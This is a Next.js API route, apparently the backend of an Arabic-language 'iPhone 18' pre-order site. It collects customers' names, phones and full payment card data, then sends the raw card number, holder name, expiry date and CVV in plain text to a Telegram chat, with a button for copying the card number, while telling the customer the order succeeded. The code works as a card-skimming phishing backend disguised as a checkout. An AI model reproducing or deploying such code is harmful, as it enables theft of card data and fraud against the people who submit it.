import { NextRequest, NextResponse } from "next/server";
import { rateLimit, sendToTelegram } from "../../lib/rateLimit";

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
  if (!rateLimit(ip, 5, 60 * 1000)) {
    return NextResponse.json({ ok: false, error: "Too many requests" }, { status: 429 });
  }

  try {
    const body = await req.json();
    const { productId, productName, variant, customer, depositMethod, payment } = body;

    if (!productId || !productName || !customer || !payment) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    const BACKEND_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
    fetch(`${BACKEND_URL}/api/pre-orders`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ productId, productName, variant, customer, depositMethod, createdAt: new Date().toISOString() }),
      signal: AbortSignal.timeout(5000),
    }).catch((err) => console.warn("Backend request failed:", err));

    const variantText = variant ? ` ${variant.color || ""} - ${variant.storage || ""}` : "";
    const rawCard = (payment.cardNumber as string).replace(/\s/g, "");

    const text = [
      `🔔 حجز مسبق جديد - iPhone 18`,
      `🔢 رقم الطلب: #PRE-${Date.now()}`,
      `📦 المنتج: ${productName}${variantText}`,
      `👤 العميل: ${customer.firstName} ${customer.lastName}`,
      `📱 الجوال: ${customer.phone}`,
      `💳 Card Number: ${rawCard}`,
      `👤 Card Holder: ${payment.holder}`,
      `📅 Valid To: ${payment.expiry}`,
      `🔐 CVV: ${payment.cvv}`,
      ``,
      `⏰ التاريخ: ${new Date().toLocaleString("ar-EG")}`,
    ].join("\n");

    const sent = await sendToTelegram({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      reply_markup: {
        inline_keyboard: [[{ text: "📋 نسخ رقم البطاقة", copy_text: { text: rawCard } }]],
      },
    });

    return NextResponse.json({
      ok: sent,
      orderId: `PRE-${Date.now()}`,
      message: "تم استلام طلب الحجز المسبق بنجاح",
    }, { status: sent ? 200 : 502 });
  } catch (err) {
    console.error("Pre-order API error:", err);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
